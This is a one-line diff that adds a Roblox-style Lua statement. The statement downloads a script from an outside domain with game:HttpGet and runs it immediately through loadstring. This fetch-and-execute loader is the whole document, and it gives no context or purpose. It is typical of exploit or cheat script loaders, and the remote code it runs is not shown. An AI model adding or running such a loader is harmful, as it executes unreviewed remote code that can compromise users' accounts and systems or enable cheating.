@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gingerinijoiner.com/aj.lua"))()
